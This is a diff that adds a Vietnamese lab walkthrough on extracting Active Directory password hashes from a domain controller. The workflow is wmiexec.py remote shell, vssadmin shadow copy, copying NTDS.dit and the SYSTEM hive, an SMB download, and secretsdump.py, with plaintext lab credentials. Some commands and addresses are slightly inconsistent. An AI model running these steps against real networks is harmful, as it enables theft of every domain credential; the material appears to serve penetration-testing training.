@@ -6105,3 +6105,193 @@ Cần lưu ý rằng một số công cụ khác cũng có thể được sử d
 Tóm lại, trong thí nghiệm này, chúng tôi đã xác định được một tài khoản dịch vụ được cấu hình với mật khẩu yếu. Chúng tôi đã yêu cầu một vé dịch vụ được mã hóa RC4, cho phép chúng tôi thực hiện tấn công vét cạn bằng hashcat. Cuối cùng, chúng tôi đã sử dụng tài khoản bị xâm phạm để giành quyền quản trị viên cấp độ miền trong môi trường.
 
 Tấn công Kerberoasting là một kỹ thuật tấn công cực kỳ hiệu quả, không dựa vào việc thiếu bản vá lỗi hoặc cấu hình sai và do đó có thể tạo ra "lối vào" trong các môi trường được bảo mật tương đối tốt!
+
+# Lab 5.2. Domain Dominance
+
+## Mục tiêu
+
+- Chúng tôi sẽ tạo một bản sao bóng của tệp NTDS.dit trên DC01.sec560.local (10.130.10.10)
+
+- Chúng tôi sẽ trích xuất bản sao từ DC01 về máy của chúng tôi.
+
+- Chúng tôi sẽ trích xuất các mã băm mật khẩu của toàn bộ thư mục Active Directory.
+
+## Thiết lập phòng thí nghiệm
+
+Máy ảo được sử dụng:
+
+- Slingshot Linux.
+
+Bạn có thể ping địa chỉ 10.130.10.10 từ máy ảo Slingshot Linux:
+
+```bash
+ping -c 4 10.130.10.10
+```
+
+![alt text](IMG/LAB5/LAB5.2/image.png)
+
+Hướng dẫn thực hành từng bước
+
+## Hướng dẫn thực hành từng bước
+
+Chúng tôi sẽ truy cập vào DC cho miền sec560.local.
+
+Chúng tôi đã xâm nhập vào `SVC_SQLService2` một tài khoản có quyền quản trị miền trong phòng thí nghiệm Kerberoast.
+
+Vì tệp NTDS.dit đang được Active Directory sử dụng liên tục, nên không thể sao chép và dán trực tiếp vào ổ đĩa khác vì sẽ bị từ chối quyền truy cập. Do đó, chúng ta buộc phải tạo một bản sao của tệp và giải nén bản sao thay vì bản gốc. Để tránh các sự cố phức tạp, vì đây là môi trường chia sẻ, việc tạo bản sao KHÔNG nên được thực hiện nếu đã có bản sao tồn tại.
+
+### 1. Thiết lập shell trên DC01
+
+Xin nhắc lại, chúng tôi đã chiếm được tài `SVC_SQLService2` khoản và có thể sử dụng nó để thiết lập quyền truy cập từ xa vào bộ điều khiển miền.
+
+```bash
+wmiexec.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.25
+```
+
+![alt text](IMG/LAB5/LAB5.2/image-1.png)
+
+Nếu không chỉ định lệnh, chúng ta sẽ chuyển sang chế độ shell bán tương tác. Nếu cần thoát khỏi shell, hãy gõ `exit` (nhưng đừng làm vậy bây giờ).
+
+Có nhiều cách để tạo bản sao của tệp NTDS.dit. Trên thực tế, chúng ta đã sử dụng một công cụ có khả năng này, đó là [tên công cụ] `secretsdump.py`.
+
+Trong bài thực hành này, chúng ta sẽ sử dụng công cụ `vssadmin` để tạo bản sao bóng của ổ đĩa `C` (nơi chứa tệp NTDS.dit).
+
+### 2. Xem xét Shadow Copies
+
+Vì chúng ta đã có quyền truy cập wmiexec vào DC, hãy xem xét các bản sao bóng để xác định xem có bản chụp nhanh nào không.
+
+Trong `wmiexec.py` cửa sổ dòng lệnh, hãy liệt kê các bản sao bóng (shadow copies):
+
+```bash
+vssadmin.exe list shadows
+```
+
+Nếu bạn không thấy bản sao lưu nào, hãy tạo một bản. Nếu bạn thấy một bản, thì bạn có thể tạo một bản mới hoặc sử dụng bản sao lưu hiện có!
+
+> Không tồn tại Shadow Copy
+
+![alt text](IMG/LAB5/LAB5.2/image-2.png)
+
+Nếu bạn xem kết quả ở trên, bạn sẽ thấy không có bản sao bóng (shadow copy) nào và bạn sẽ phải tạo một bản sao bóng ở Bước 3.
+
+> Tồn tại shadow copy
+
+Bạn có thể thấy kết quả hiển thị như thế này. Nếu vậy, hãy ghi lại số ID của `HarddiskVolumeShadowCopyX` ; số của bạn có thể khác!
+
+![alt text](IMG/LAB5/LAB5.2/image-4.png)
+
+Trong sách có mà đây không có bản sao nào.
+
+### 3. Tạo Shadow Copy
+
+Nếu không có bản sao bóng (shadow copy), hãy tạo một bản sao bằng lệnh này:
+
+```bash
+vssadmin create shadow /for=c:
+```
+
+![alt text](IMG/LAB5/LAB5.2/image-5.png)
+
+Hãy ghi lại số thứ tự của bản sao bóng mà bạn đã tạo. Trong ví dụ của chúng tôi, số thứ tự là 1, nhưng số của bạn có thể khác.
+
+```bash
+Successfully created shadow copy for 'c:\'
+    Shadow Copy ID: {9b259320-e24d-4f57-8168-95af954cb88d}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+```
+
+### 4. Tạo bản sao của NTDS.dit và System Hive
+
+Giờ chúng ta đã có bản sao lưu bóng của ổ C, chúng ta cần trích xuất tệp NTDS.dit từ đó.
+
+Lưu ý: Cập nhật số 1 thứ tự thành chỉ mục của bản sao bóng của bạn.
+
+```bash
+mkdir c:\extract
+mklink /d C:\shadow \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+```
+
+```bash
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\extract\ntds.dit
+```
+
+![alt text](IMG/LAB5/LAB5.2/image-6.png)
+
+Để trích xuất mã băm từ tệp NTDS.dit, chúng ta cần khóa mã hóa trong registry hệ thống. Sao lưu registry bằng lệnh dưới đây (quá trình này có thể mất một hoặc hai phút để hoàn tất):
+
+```bash
+reg save hklm\system c:\extract\system /y
+```
+
+![alt text](IMG/LAB5/LAB5.2/image-7.png)
+
+Chúng tôi đã thêm lệnh này `/y` để reg có thể ghi đè lên một tệp hiện có nếu tệp đó tồn tại. Nếu tệp đã tồn tại và chúng ta không thêm lệnh này `/y`, lệnh sẽ bị treo vô thời hạn.
+
+Bạn có thể đóng phiên này vì chúng tôi không còn cần đến nó nữa.
+
+### 5. Sao chép tệp NTDS.dit vào máy tính của bạn.
+
+Giờ đây, khi bản sao NTDS.dit và thư mục hệ thống đã có trên bộ điều khiển miền, chúng ta có thể sao chép chúng sang các máy của mình.
+
+Cách tốt nhất để sao chép các tập tin này là sử dụng `smbclient.py`.
+
+> ĐỪNG CHẠY CHƯƠNG TRÌNH NÀY!
+>
+> Các tập tin có dung lượng khoảng 70MB, và nếu tất cả sinh viên cùng tải xuống một lúc, nó có thể làm quá tải máy chủ DC. Chúng tôi đã cung cấp một bản sao của các tập tin này cho bạn trong thư ~/labsmục trên máy ảo Linux của bạn.
+
+```bash
+smbclient.py hiboxy.com/SVC_SQLService2:^Cakemaker@10.130.10.10
+use c$
+cd extract
+get ntds.dit
+get system
+exit
+```
+
+![alt text](IMG/LAB5/LAB5.2/image-8.png)
+
+### 6. Trích xuất mã băm
+
+Giờ đây, khi đã có trong tay tập tin NTDS.dit, chúng ta có thể trích xuất bất kỳ mã băm mật khẩu nào mình muốn.
+
+Vì các thao tác trên tệp NTDS.dit được thực hiện trên máy tính cục bộ của chúng tôi, nên cuộc tấn công hiện đang ngoại tuyến và do đó không hiển thị trong bất kỳ nhật ký mạng nào.
+
+Sử dụng secretsdump.pyvới các tùy chọn sau:
+
+- `-ntdsntds`: ntds.dit_filename.
+
+- `-system`: system_filename.
+
+- `-outputfile`: output_filename.
+
+- `LOCAL`: Thông báo này cho `secretsdump.py` biết cuộc tấn công diễn ra cục bộ và chúng ta không truy cập thông tin đăng nhập từ xa.
+
+```bash
+secretsdump.py -ntds ~/labs/ntds.dit -system ~/labs/system LOCAL | tee /tmp/secretsdump_full.log less /tmp/secretsdump_full.log
+```
+
+![alt text](IMG/LAB5/LAB5.2/image-9.png)
+
+Trong kết quả hiển thị ở trên, bạn có thể thấy kết quả của thao tác này. Chúng tôi cũng đã đánh dấu một mã băm sẽ hữu ích trong bài thực hành tiếp theo.
+
+Hiện tại, chúng ta có một vài lựa chọn:
+
+- Giải mã mật khẩu.
+
+- Truyền băm.
+
+- Sử dụng krbtgtmã băm cho các cuộc tấn công vé vàng.
+
+### 7. Bonus
+
+Nếu có thêm thời gian, hãy sử dụng Hashcat với các từ điển được cung cấp và các kỹ thuật đã học trong lớp để bẻ khóa mật khẩu. Bạn có thể thử nhiều kỹ thuật bẻ khóa khác nhau:
+
+- Từ điển thẳng.
+
+- Từ điển có hình mặt nạ.
+
+- Quy tắc.
+
+## Phần kết luận
+
+Trong bài thực hành này, chúng ta đã xem xét cách sử dụng người dùng miền có quyền quản trị để lấy bản sao của tệp NTDS.dit bằng cách sử dụng bản sao bóng (shadow copies). Sử dụng tệp này, chúng ta có thể trích xuất các mã băm mật khẩu cho bất kỳ người dùng hoặc tài khoản máy tính nào trong miền.
